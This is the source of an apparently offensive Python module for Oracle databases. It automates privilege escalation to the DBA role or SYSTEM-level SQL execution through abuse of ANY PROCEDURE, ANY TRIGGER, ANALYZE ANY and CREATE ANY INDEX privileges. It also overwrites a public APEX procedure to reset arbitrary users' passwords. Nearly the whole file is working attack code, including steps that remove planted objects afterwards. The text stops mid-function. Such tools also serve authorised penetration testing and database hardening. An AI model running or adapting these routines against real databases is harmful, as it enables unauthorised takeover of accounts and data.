#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging, time
from Constants import *
#from Info import Info
from Utils import checkOptionsGivenByTheUser, generateRandomString, ErrorSQLRequest

class PrivilegeEscalation (OracleDatabase):
	'''
	Privilege Escalation Module
	'''
	
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("PrivilegeEscalation object created")
		OracleDatabase.__init__(self,args)
		#Ccommon
		self.GRANT_DBA_TO_USER = "GRANT dba TO {0}"#{0} User
		
	def revokeDbaRole(self, user=None):
		'''
		If user = None, user = current user
		Returns True if nor error
		Otherwise return Error
		'''
		self.REVOKE_DBA_FROM_USER = "REVOKE dba FROM {0}"#{0} User
		if user == None : user = self.args['user']
		logging.info("Trying to revoke DBA role from '{0}'".format(user))
		status = self.__execPLSQL__(self.REVOKE_DBA_FROM_USER.format(user))
		if isinstance(status, Exception):
			logging.info("Impossible to revoke DBA role from {0}: {1}".format(user, self.cleanError(status)))
			return status
		else : 
			logging.debug("The DBA role has been revoked from {0}".format(user))
			return True

	def printPrivilegesAndRoles(self, deep=True):
		'''
		print privileges and roles of current user
		Return True or Exception
		'''
		
		def __printPrivsOfThisRole__(role, tabulation='', tabSize='\t'):
			'''
			system privileges granted to this role.
			'''
			REQ_GET_PRIVS_OF_THIS_ROLE = "SELECT DISTINCT privilege FROM role_sys_privs ORDER BY 1"
			results1 = self.__execQuery__(query=REQ_GET_PRIVS_OF_THIS_ROLE, ld=['privilege'])
			if isinstance(results1,Exception):
				logging.info("Impossible to get current privileges: {0}.".format(results1))
				return results1
			else:
				for aPriv in results1:
					if aPriv['privilege'] in EXPLOITABLE_SYSTEM_PRIVILEGES: print "{0}system privege: {1}\t <-- exploitable".format(tabulation, self.args['print'].getColoredString(aPriv['privilege'], 'green'))
					else: print "{0}system privege: {1}".format(tabulation, aPriv['privilege'])
			
		def __printRolesOfThisRole__(role, tabulation='', tabSize='\t'):
			'''
			Roles granted to this role
			'''
			REQ_GET_PRIVS_OF_THIS_ROLE = "SELECT DISTINCT granted_role FROM role_role_privs ORDER BY 1"
			results1 = self.__execQuery__(query=REQ_GET_PRIVS_OF_THIS_ROLE, ld=['granted_role'])
			if isinstance(results1,Exception):
				logging.info("Impossible to get current privileges: {0}.".format(results1))
				return results1
			else:
				for aRole in results1:
					print '{0}role: {1}'.format(tabulation, aRole['granted_role'])
		
		
		REQ_GET_CURRENT_PRIVS = "SELECT DISTINCT privilege FROM user_sys_privs order by 1"
		REQ_GET_CURRENT_ROLES = "SELECT DISTINCT granted_role FROM user_role_privs order by 1"
		results1 = self.__execQuery__(query=REQ_GET_CURRENT_PRIVS, ld=['privilege'])
		if isinstance(results1,Exception):
			logging.info("Impossible to get current privileges: {0}.".format(results1))
			return results1
		else:
			logging.info("Privileges of current Oracle user gotten: {0}".format(results1))
			results2 = self.__execQuery__(query=REQ_GET_CURRENT_ROLES, ld=['granted_role'])
			if isinstance(results2,Exception):
				logging.info("Impossible to get current privileges: {0}.".format(results2))
				return results2
			else:
				logging.info("Roles of current Oracle user gotten: {0}".format(results2))
				#print "System privileges granted the current user ({0}):".format(self.args['user'])
				for aPriv in results1:
					if aPriv['privilege'] in EXPLOITABLE_SYSTEM_PRIVILEGES: print "- system privege: {0}\t <-- exploitable".format(self.args['print'].getColoredString(aPriv['privilege'], 'green'))
					else: print "- system privege: {0}".format(aPriv['privilege'])
				if len(results2)==0:
					#print "Roles granted to the current user ({0}): Not one.".format(self.args['user'])
					pass
				else:
					#print "Roles granted to the current user ({0}):".format(self.args['user'])
					for aRole in results2:
						print "- role: {0}".format(aRole['granted_role'])
						if deep == True:
							logging.info("Searching system privileges and roles of this role {0}".format(aRole['granted_role']))
							__printPrivsOfThisRole__(role=aRole['granted_role'],tabulation='\t- ')
							__printRolesOfThisRole__(role=aRole['granted_role'],tabulation='\t- ')
				return True
		
		"""		
		def printPrivilegesAndRoles(self):
		'''
		print privileges and roles of current user
		Return True or Exception
		'''
		REQ_GET_CURRENT_PRIVS = "SELECT privilege FROM user_sys_privs order by 1"
		REQ_GET_CURRENT_ROLES = "SELECT granted_role FROM user_role_privs order by 1"
		REQ_GET_PRIV_OF_A_ROLE = "SELECT privilege FROM role_sys_privs WHERE role = '{0}' order by 1"
		results1 = self.__execQuery__(query=REQ_GET_CURRENT_PRIVS, ld=['privilege'])
		if isinstance(results1,Exception):
			logging.info("Impossible to get current privileges: {0}.".format(results1))
			return results1
		else:
			logging.info("Privileges of current Oracle user gotten: {0}".format(results1))
			results2 = self.__execQuery__(query=REQ_GET_CURRENT_ROLES, ld=['granted_role'])
			if isinstance(results2,Exception):
				logging.info("Impossible to get current privileges: {0}.".format(results2))
				return results2
			else:
				logging.info("Roles of current Oracle user gotten: {0}".format(results2))
				print "System privileges granted the current user ({0}):".format(self.args['user'])
				for aPriv in results1:
					print "- {0}".format(aPriv['privilege'])
					
				if len(results2)==0:
					print "Roles granted to the current user ({0}): Not one.".format(self.args['user'])
				else:
					print "Roles granted to the current user ({0}):".format(self.args['user'])
					for aRole in results2:
						print "- {0}".format(aRole['granted_role'])
						logging.info("Searching system privileges of this role {0}".format(aRole['granted_role']))
						results3 = self.__execQuery__(query=REQ_GET_PRIV_OF_A_ROLE.format(aRole['granted_role']), ld=['privilege'])
						if isinstance(results3,Exception):
							logging.info("Impossible to get privileges of role {1}: {0}.".format(results3), aRole['granted_role'])
							return results3
						else:
							logging.debug("System privileges of this role: {0}".format(results3))
							for aPrivFromRole in results3:
								print "  - {0}".format(aPrivFromRole['privilege'])
				return True
		"""

	####################################################################################################################
	#						Privilege escalation via CREATE/EXECUTE ANY PROCEDURE privileges
	#
	#	Create a stored procedure in system schema (CREATE ANY PROCEDURE) and execute it (EXECUTE ANY PROCEDURE).
	#	Methods implemented:
	#	- give to the current user the DBA role;
	#	- execute a request as sys.
	####################################################################################################################	
	def executeRequestWithExecuteAnyProcedureMethod (self, privRequest=None):
		'''
		Create a stored procedure in system schema (CREATE ANY PROCEDURE) and execute it (EXECUTE ANY PROCEDURE).
		Returns True if no error. Otherwise returns Exception
		'''
		self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE = "system.odatstoredproc"
		self.CREATE_STORED_PROCEDURE_FOR_CREATE_EXECUTE_ANY_PROCEDURE="CREATE OR REPLACE PROCEDURE {0} IS BEGIN EXECUTE IMMEDIATE '{1}'; END;" #{0}:procedure name {1}:Request to execute
		self.EXECUTE_STORED_PROCEDURE="BEGIN {0}; END;"#{0}:procedure name
			
		logging.info("Trying to create the stored procedure {1} for executing the request '{0}'".format(repr(privRequest), self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE))
		status = self.__execPLSQL__(self.CREATE_STORED_PROCEDURE_FOR_CREATE_EXECUTE_ANY_PROCEDURE.format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE, privRequest))
		if isinstance(status, Exception):
			logging.info("Impossible to create the stored procedure named '{0}': {1}".format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE, self.cleanError(status)))
			return status
		else : 
			logging.debug("Stored procedure {0} created".format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE))
			logging.info("Trying to execute the stored procedure '{0}'".format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE))
			status = self.__execPLSQL__(self.EXECUTE_STORED_PROCEDURE.format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE))
			if isinstance(status, Exception):
				logging.info("Impossible to execute the stored procedure named '{0}': {1}".format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE, self.cleanError(status)))
				self.dropStoredProcedure(procName=self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE)
				return status
			else : 
				logging.debug("Stored procedure named '{0}' executed".format(self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE))
				self.dropStoredProcedure(procName=self.STORED_PROC_NAME_FOR_CREATE_EXECUTE_ANY_PROCEDURE)
				return True
	
	def giveDbaRoleWithExecuteAnyProcedureMethod(self, user=None):
		'''
		Try to give the dba role to user
		If user = None, user = current user
		Returns:
		- True if the dba role has been given to user
		- False if the dba role has NOT been given to user (error)
		- None if the user has dba role already
		'''
		if user == None : user = self.args['user']
		logging.info("Trying to give the DBA role to {0} using CREATE/EXECUTE ANY PROCEDURE method".format(user))
		isDBA = self.hasThisRole('DBA',user)
		if isDBA == True:
			logging.info("The {0} has already the DBA role. Nothing to do!".format(user))
			return None
		elif isDBA == None:
			logging.info("Impossible to know if {0} is DBA. Cancelling...".format(user))
			return False
		else:
			status = self.executeRequestWithExecuteAnyProcedureMethod(privRequest=self.GRANT_DBA_TO_USER.format(user))
			if isinstance(status, Exception):
				logging.debug("DBA role has not been given to {0}".format(user))
				return status
			else:
				logging.debug("DBA role has been given to {0}".format(user))
				return True
			
	####################################################################################################################
	#						Privilege escalation via CREATE ANY PROCEDURE privilege only
	#
	#	Modify a stored procedure (execute privilege is granted to PUBLIC to this procedure) and execute privileged request
	#	Methods implemented:
	#	- set password of arbitrary oracle user with APEX_ADMIN procedure owned by APEX_040200
	#	- execute a request as APEX_040200.
	####################################################################################################################
	
	def executeSytemRequestWithCreateAnyProcedureMethod (self, privRequest=None):
		'''
		When a database user has the "Execute Any Procedure" privilege, he can execute arbitrary privileged SQL requests.
		returns True if ok. Returns Exception if error.
		'''
		self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC = "APEX_ADMIN"
		self.STORED_PROC_OWNER_FOR_CREATE_ANY_PROC = "APEX_040200"
		#self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC = "SI_CONVERTFORMAT"
		#self.STORED_PROC_OWNER_FOR_CREATE_ANY_PROC = "ORDSYS"
		self.EXECUTE_STORED_PROCEDURE_FOR_CREATE_ANY_PROC="BEGIN {0}; END;"#{0}:procedure complete name
		self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC = "{0}.{1}".format(self.STORED_PROC_OWNER_FOR_CREATE_ANY_PROC, self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC)
		self.CREATE_STORED_PROCEDURE_FOR_CREATE_ANY_PROCEDURE="CREATE OR REPLACE PROCEDURE {0} IS BEGIN EXECUTE IMMEDIATE '{1}'; END;" #{0}:procedure name {1}:Request to execute
		
		def __getStoredProcedureWithoutFirstLine__():
			'''
			Copy the stored procedure WITHOUT the first line
			Returns string if no error. 
			Returns Exception if error
			'''

			self.GET_CODE_STORED_PROCEDURE="SELECT text FROM all_source WHERE name='{0}' AND owner='{1}'".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC, self.STORED_PROC_OWNER_FOR_CREATE_ANY_PROC)
			code =""
			numLine = 0
			logging.info("Trying to get source code of the stored procedure named {0} ".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC))
			response = self.__execThisQuery__(self.GET_CODE_STORED_PROCEDURE, ld=['TEXT'])
			if isinstance(response, Exception):
				logging.info("Impossible to get the source code of the stored procedure named '{0}': {1}".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC, self.cleanError(response)))
				return response
			else:
				for line in response:
					if numLine > 0:
						code += line['TEXT']
					numLine += 1
				logging.debug('Souce code of {0}: {1}'.format(self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC, repr(code)))
				return code
				
		def __restoreStoredProcedure__(storedProcCompleteName, oldSourceCode):
			'''
			Restore the stored procedure with oldSourceCode
			Returns string if no error. 
			Returns Exception if error
			'''
			REQUEST = "CREATE OR REPLACE PROCEDURE {0}\n{1}".format(storedProcCompleteName, oldSourceCode)
			logging.debug('The following request will be executed to restore the stored procedure {0}: {1}'.format(storedProcCompleteName, repr(REQUEST)))
			status = self.__execPLSQL__(REQUEST)
			if isinstance(status, Exception):
				logging.info("Impossible to restore the stored procedure named '{0}': {1}".format(storedProcCompleteName, self.cleanError(status)))
				return status
			else:
				logging.info("The stored procedure named '{0}' has been restored".format(storedProcCompleteName))
				return True
		
		logging.info("Trying to modify the stored procedure {0} for executing the request '{1}'".format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC, privRequest))
		initalSrcCode = __getStoredProcedureWithoutFirstLine__()
		if isinstance(initalSrcCode, Exception) :
			logging.info('Impossible to get the source code, cancelling attack....')
			return initalSrcCode
		elif initalSrcCode=='':
			msgerror = "The source code of {0} is empty!".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_PROC)
			logging.info(msgerror)
			return ErrorSQLRequest(msgerror)
		else:
			logging.info("Modifing the stored procedure...")
			status = self.__execPLSQL__(self.CREATE_STORED_PROCEDURE_FOR_CREATE_ANY_PROCEDURE.format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC, privRequest))
			if isinstance(status, Exception):
				logging.info("Impossible to modify the stored procedure named '{0}': {1}".format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC, self.cleanError(status)))
				return status
			else : 
				logging.debug("Stored procedure {0} modified".format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC))
				logging.info("Trying to execute the stored procedure '{0}'".format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC))
				status = self.__execPLSQL__(self.EXECUTE_STORED_PROCEDURE_FOR_CREATE_ANY_PROC.format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC))
				if isinstance(status, Exception):
					logging.info("Impossible to execute the stored procedure named '{0}': {1}".format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC, self.cleanError(status)))
					__restoreStoredProcedure__(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC, initalSrcCode)
					return status
				else : 
					logging.debug("Stored procedure named '{0}' executed".format(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC))
					__restoreStoredProcedure__(self.STORED_PROC_COMPLETE_NAME_FOR_CREATE_ANY_PROC, initalSrcCode)
					return True
			
		
	def setPasswordWithCreateAnyProcedureMethod(self, user, password):
		'''
		Set the password of an Oralce arbitrary user
		Returns:
		- True if ok
		- Exception if the dba role has NOT been given to user (error)
		'''
		self.ALTER_USER_PASSWORD_FOR_CREATE_ANY_PROCEDURE = "ALTER USER {0} IDENTIFIED BY {1}"#{0} user, {1} password
		logging.info("Trying to set the password of {0} with '{1}' using CREATE ANY PROCEDURE method only".format(user, password))
		isDBA = self.hasThisRole('DBA',user)
		if isDBA == True:
			logging.info("The {0} has already the DBA role. Nothing to do normally!".format(user))
		elif isDBA == None:
			logging.info("Impossible to know if {0} is DBA.".format(user))
		else:
			status = self.executeSytemRequestWithCreateAnyProcedureMethod(privRequest=self.ALTER_USER_PASSWORD_FOR_CREATE_ANY_PROCEDURE.format(user, password))
			if isinstance(status, Exception):
				logging.debug("The password of {0} has not been replaced by '{1}': {2}".format(user, password, status))
				return status
			else:
				logging.debug("The password of {0} has been replaced by '{1}'".format(user, password))
				return True
				
	####################################################################################################################
	#						Privilege escalation via CREATE ANY TRIGGER privilege
	#
	#	Create a stored procedure. It has to be executing with CURRENT_USER rights
	#	Create a trigger to run the stored procedure with SYS's rights.
	#	Methods implemented:
	#	- give to the current user the DBA role;
	#	- execute a request as sys
	####################################################################################################################	
	def executeSytemRequestWithCreateAnyTriggerMethod(self, privRequest):
		'''
		Try to execute the privRequest request as System with the CREATE ANY TRIGGER method
		If user = None, user = current user
		Returns:
		- True if the request has been executed
		- Exception if error
		'''
		self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER = "get_dba_create_any_trigger"
		self.CREATE_STORED_PROC_FOR_CREATE_ANY_TRIGGER = "CREATE OR REPLACE PROCEDURE {0} authid current_user is pragma autonomous_transaction; BEGIN execute immediate '{1}';END;" #{0} procedure name, {1} Request to execute
		self.TABLE_NAME_FOR_CREATE_ANY_TRIGGER = "ol$"
		self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER = "system"
		self.COMPLETE_TABLE_NAME_FOR_CREATE_ANY_TRIGGER = '{0}.{1}'.format(self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER, self.TABLE_NAME_FOR_CREATE_ANY_TRIGGER)
		self.TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER = "ol$insert_trg"
		self.COMPLETE_TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER = "{0}.{1}".format(self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER, self.TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER)
		self.GRANT_EXECUTE_ON_PROC_FOR_CREATE_ANY_TRIGGER = "grant execute on {0} TO {1}"#{0}procedure name, {1} user
		self.CREATE_TRIGGER_FOR_CREATE_ANY_TRIGGER = "CREATE OR REPLACE TRIGGER {0} before insert on {1} for each row begin {2}.{3};end;"#{0} Comple Trigger name, {1} complete table name, {2} Oracle user not privileged (PROC), {3} Procedure name
		self.INSERT_TABLE_FOR_CREATE_ANY_TRIGGER = "INSERT INTO {0}(CATEGORY) values ('{1}')".format(self.COMPLETE_TABLE_NAME_FOR_CREATE_ANY_TRIGGER, generateRandomString(length=20))
		user = self.args['user']
		logging.info("Trying to create the stored procedure {0} for executing the request '{1}'".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, repr(privRequest)))
		status = self.__execPLSQL__(self.CREATE_STORED_PROC_FOR_CREATE_ANY_TRIGGER.format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, privRequest))
		if isinstance(status, Exception):
			logging.info("Impossible to create the stored procedure named '{0}': {1}".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, self.cleanError(status)))
			return status
		else : 
			logging.debug("The stored procedure {0} has been created".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER))
			logging.info("Trying to grant execute privilege on {0} to {1}".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER))
			status = self.__execPLSQL__(self.GRANT_EXECUTE_ON_PROC_FOR_CREATE_ANY_TRIGGER.format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER))
			if isinstance(status, Exception):
				logging.info("Impossible to grant execute privilege on {0} to {1}: {2}".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER, self.cleanError(status)))
				self.dropStoredProcedure(procName=self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER)
				return status
			else : 
				logging.debug("Execute privilege on {0} to {1} has been granted".format(self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER, self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER))
				logging.info("Trying to create the trigger {0}'".format(self.COMPLETE_TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER))
				status = self.__execPLSQL__(self.CREATE_TRIGGER_FOR_CREATE_ANY_TRIGGER.format(self.COMPLETE_TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER,
																								self.COMPLETE_TABLE_NAME_FOR_CREATE_ANY_TRIGGER,
																								user,
																								self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER))
				if isinstance(status, Exception):
					logging.info("Impossible to create the trigger {0}: {1}".format(self.COMPLETE_TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER, self.cleanError(status)))
					self.dropStoredProcedure(procName=self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER)
					return status
				else: 
					logging.debug("The trigger {0} has been created".format(self.COMPLETE_TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER))
					logging.info("Inserting a value in {0} to start the trigger {1}'".format(self.COMPLETE_TABLE_NAME_FOR_CREATE_ANY_TRIGGER, self.COMPLETE_TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER))
					status = self.__execPLSQL__(self.INSERT_TABLE_FOR_CREATE_ANY_TRIGGER)
					if isinstance(status, Exception):
						logging.info("Impossible to insert data into {0}: {1}".format(self.COMPLETE_TABLE_NAME_FOR_CREATE_ANY_TRIGGER, self.cleanError(status)))
						self.dropTrigger(triggerName=self.TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER, schema=self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER)
						self.dropStoredProcedure(procName=self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER)
						return status
					else: 
						logging.debug('The trigger has been started. The user {0} is DBA now!'.format(user))
						self.dropTrigger(triggerName=self.TRIGGER_NAME_FOR_CREATE_ANY_TRIGGER, schema=self.OWNER_NAME_OF_TABLE_FOR_CREATE_ANY_TRIGGER)
						self.dropStoredProcedure(procName=self.STORED_PROC_NAME_FOR_CREATE_ANY_TRIGGER)
						return True
	
	def giveDbaRoleWithCreateAnyTriggerMethod (self, user=None):
		'''
		Try to give the dba role to user
		If user = None, user = current user
		Returns:
		- True if the dba role has been given to user
		- False if the dba role has NOT been given to user (error)
		- None if the user has dba role already
		'''
		
		if user == None : user = self.args['user']
		logging.info("Trying to give the DBA role to {0} using CREATE ANY TRIGGER method".format(user))
		isDBA = self.hasThisRole('DBA',user)
		if isDBA == True:
			logging.info("The {0} has already the DBA role. Nothing to do!".format(user))
			return None
		elif isDBA == None:
			logging.info("Impossible to know if {0} is DBA. Cancelling...".format(user))
			return False
		else:
			privRequest = self.GRANT_DBA_TO_USER.format(user)
			logging.info("Trying to give dba role to current user with {0}".format(repr(privRequest)))
			status = self.executeSytemRequestWithCreateAnyTriggerMethod(privRequest=privRequest)
			if status == True:
				logging.info('The DBA role has been granted to {0}'.format(user))
				return True
			else:
				logging.info('The DBA role has NOT been granted to {0}'.format(user))
				return False
			

	####################################################################################################################
	#						Privilege escalation via ANALYZE ANY privilege
	#
	#	Methods implemented:
	#	- give to the current user the DBA role;
	#	- execute a request as sys
	####################################################################################################################
	def executeSytemRequestWithAnalyzeAnyMethod(self, privRequest):
		'''
		Try to execute the privRequest request as System with the ANALYZE ANY method
		If user = None, user = current user
		Returns:
		- True if the request has been executed
		- Exception or False if error
		'''
		
		def __dropAnalyze__(user,procedureName):
			'''
			Return Exception if error, otherwise return True
			'''
			REQ_DROP_EXTENDED_STATS = "BEGIN DBMS_STATS.DROP_EXTENDED_STATS ('SYSTEM',  'HELP', '({0}.{1}(INFO))'); END;" #{0} user, {1} procedure name
			logging.info("Trying to drop the extended stats created")
			status = self.__execPLSQL__(REQ_DROP_EXTENDED_STATS.format(user, procedureName))
			if isinstance(status, Exception):
				logging.info("Impossible to drop extended stats: {0}".format(self.cleanError(status)))
				return status
			else : 
				logging.debug("Extended stats dropped")
				return True
		
		self.FUNCTION_NAME_FOR_ANALYZE_ANY = "get_dba_analyse_any"
		self.CREATE_FUNCTION_FOR_ANALYZE_ANY = "CREATE OR REPLACE FUNCTION {0}(value varchar2) return varchar2 deterministic authid current_user is pragma autonomous_transaction; begin execute immediate '{1}';return 'FALSE';END {0};"#{0} procedure name, {1} Request to execute 
		self.RUN_ANALYZE_FOR_ANALYZE_ANY = "BEGIN dbms_stats.gather_table_stats(ownname => 'SYSTEM', tabname => 'HELP', method_opt => 'for columns ({0}.{1}(INFO)) size auto'); END;"#{0} user, {1} function name to execute
		user = self.args['user']
		logging.info("Trying to create the stored procedure {0} for executing the request '{1}' as SYSTEM with CREATE ANY INDEX method".format(self.FUNCTION_NAME_FOR_ANALYZE_ANY, repr(privRequest)))
		status = self.__execPLSQL__(self.CREATE_FUNCTION_FOR_ANALYZE_ANY.format(self.FUNCTION_NAME_FOR_ANALYZE_ANY, privRequest))
		if isinstance(status, Exception):
			logging.info("Impossible to create the stored function named '{0}': {1}".format(self.FUNCTION_NAME_FOR_ANALYZE_ANY, self.cleanError(status)))
			return status
		else : 
			logging.debug("The stored procedure {0} has been created".format(self.FUNCTION_NAME_FOR_ANALYZE_ANY))
			__dropAnalyze__(user=user, procedureName=self.FUNCTION_NAME_FOR_ANALYZE_ANY)
			logging.info("Grant execute privilege on {0} to system".format(self.FUNCTION_NAME_FOR_ANALYZE_ANY))
			status = self.grantPrivilegeOnObjectToUser('execute', self.FUNCTION_NAME_FOR_ANALYZE_ANY, 'system')
			if isinstance(status, Exception):
				self.dropStoredFunction(self.FUNCTION_NAME_FOR_ANALYZE_ANY, 'system')
				return status
			else:
				logging.debug('Execute privilege has been granted on the stored function to system')
				logging.info("Trying to start the analyze for executing the request {0} as SYSTEM".format(repr(privRequest)))
				status = self.__execPLSQL__(self.RUN_ANALYZE_FOR_ANALYZE_ANY.format(user, self.FUNCTION_NAME_FOR_ANALYZE_ANY))
				if isinstance(status, Exception):
					logging.info("Impossible to run the analyze: {0}".format(self.cleanError(status)))
					self.dropStoredFunction(self.FUNCTION_NAME_FOR_ANALYZE_ANY, user)
					return status
				else : 
					logging.info("Analyse finished. The following request has been executed with SYSTEM privileges: {0}".format(repr(privRequest)))
					__dropAnalyze__(user=user, procedureName=self.FUNCTION_NAME_FOR_ANALYZE_ANY)
					self.dropStoredFunction(self.FUNCTION_NAME_FOR_ANALYZE_ANY)
					return True
	
	
	def giveDbaRoleWithAnalyzeAnyMethod (self):
		'''
		Try to give the dba role to user
		If user = None, user = current user
		Returns:
		- True if the dba role has been given to user
		- False if the dba role has NOT been given to user (error)
		- None if the user has dba role already
		'''
		user = self.args['user']
		logging.info('Trying to grant DBA role to {0} using ANALYZE ANY method'.format(user))
		isDBA = self.hasThisRole('DBA',user)
		if isDBA == True:
			logging.info("The {0} has already the DBA role. Nothing to do!".format(user))
			return None
		elif isDBA == None:
			logging.info("Impossible to know if {0} is DBA. Cancelling...".format(user))
			return False
		else:
			logging.info("The {0} is not DBA. Continue...".format(user))
			grantDBArequest = self.GRANT_DBA_TO_USER.format(user)
			status = self.executeSytemRequestWithAnalyzeAnyMethod(privRequest=grantDBArequest)
			if status == True:
				logging.info('The DBA role has been granted to {0}'.format(user))
				return True
			else:
				logging.info('The DBA role has NOT been granted to {0}'.format(user))
				return False
			
	####################################################################################################################
	#						Privilege escalation via CREATE ANY INDEX privilege
	#
	#	Methods implemented:
	#	- give to the current user the DBA role;
	#	- execute a request as sys
	####################################################################################################################
	def executeSytemRequestWithCreateAnyIndexMethod(self, privRequest):
		'''
		Try to execute the privRequest request as System with the CREATE ANY INDEX method
		If user = None, user = current user
		Returns:
		- True if the request has been executed without error
		- Exception if error
		'''
		self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX = "get_dba_create_any_index"
		self.INDEX_NAME_FOR_CREATE_ANY_INDEX = "get_dba_create_any_index"
		self.CREATE_FUNCTION_FOR_CREATE_ANY_INDEX = "CREATE OR REPLACE FUNCTION {0}(val varchar2) return varchar2 deterministic authid current_user is pragma autonomous_transaction; BEGIN execute immediate '{1}'; return 'TRUE';END;"#{0} procedure name, {1} Request to execute 
		self.CREATE_INDEX_FOR_CREATE_ANY_INDEX = "CREATE INDEX system.{0} ON system.ol$({1}.{2}(VERSION))"#{0} index name stored in system schema, {1} user, {2} function name to execute
		self.INSERT_INTO_FOR_CREATE_ANY_INDEX = "INSERT INTO system.ol$(version) VALUES ('{0}')".format(generateRandomString(12))
		user = self.args['user']
		logging.info("Trying to drop an old index on the table system.ol$")
		self.dropIndex(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, 'system')
		logging.info("Trying to create the stored procedure {0} for executing the request '{1}' as SYSTEM with CREATE ANY INDEX method".format(self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX, repr(privRequest)))
		status = self.__execPLSQL__(self.CREATE_FUNCTION_FOR_CREATE_ANY_INDEX.format(self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX, privRequest))
		if isinstance(status, Exception):
			logging.info("Impossible to create the stored function named '{0}': {1}".format(self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX, self.cleanError(status)))
			return status
		else : 
			logging.debug("The stored procedure {0} has been created".format(self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX))
			logging.info("Grant execute privilege on {0} to system".format(self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX))
			status = self.grantPrivilegeOnObjectToUser('execute', self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX, 'system')
			if isinstance(status, Exception):
				self.dropStoredFunction(self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX, 'system')
				return status
			else:
				logging.debug('Execute privilege has been granted on the stored function to system')
				logging.info("Trying to create the index on system.ol$")
				status = self.__execPLSQL__(self.CREATE_INDEX_FOR_CREATE_ANY_INDEX.format(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, user, self.FUNCTION_NAME_FOR_CREATE_ANY_INDEX))
				if isinstance(status, Exception):
					logging.info("Impossible to create the index {0}: {1}".format(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, self.cleanError(status)))
					self.dropStoredFunction(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, 'system')
					return status
				else : 
					logging.debug("{0} index has been created in system schema".format(self.INDEX_NAME_FOR_CREATE_ANY_INDEX))
					logging.info("Trying to insert into system.ol$ for executing the request {0} as SYSTEM".format(repr(privRequest)))
					status = self.__execPLSQL__(self.INSERT_INTO_FOR_CREATE_ANY_INDEX)
					if isinstance(status, Exception):
						logging.info("Impossible to insert into system.ol$: {0}".format(self.cleanError(status)))
						self.dropIndex(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, 'system')
						self.dropStoredFunction(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, 'system')
						return status
					else : 
